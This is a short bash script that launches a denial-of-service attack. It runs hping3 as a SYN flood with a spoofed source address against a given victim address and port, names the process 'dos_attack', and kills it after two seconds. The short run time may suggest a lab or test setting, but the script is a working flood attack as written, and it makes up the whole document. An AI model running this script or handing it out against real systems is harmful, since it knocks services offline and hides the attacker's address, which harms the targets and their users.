#!/bin/bash

source_addr=$1
victim_addr=$2
dport=$3

bash -c "exec -a dos_attack hping3 -c 10000 -d 120 -S -w 64 -p ${dport} --flood -a ${source_addr} ${victim_addr} &";

sleep 2;
pkill -f dos_attack;
